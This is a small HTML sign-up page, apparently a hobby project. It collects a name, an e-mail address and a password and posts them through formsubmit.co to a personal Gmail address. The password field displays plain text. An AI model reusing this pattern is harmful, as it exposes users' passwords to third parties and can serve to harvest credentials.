<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="signup.css">
  <script defer src="signup.js"></script>
</head>

<body>
  <main id="main-holder">
    <h1 id="login-header">Sign Up</h1>
    
    <div id="login-error-msg-holder">
      <p id="login-error-msg">Invalid username <span id="error-msg-second-line">and/or password</span></p>
    </div>
    
    <form id="login-form" action="https://formsubmit.co/htmlctsup@gmail.com" method="POST">
      <input type="text" name="name" class="login-form-field" placeholder="Name" required>
      <input type="email" name="username" id="username-field" class="login-form-field" placeholder="E-Mail" required>
      <input type="text" name="password" id="password-field" class="login-form-field" placeholder="Password" required>
      <button value="Login" id="login-form-submit" type="submit">Sign Up</button>
      <br>
      
      
    </form>
                                           
  </main>
</body>

</html>
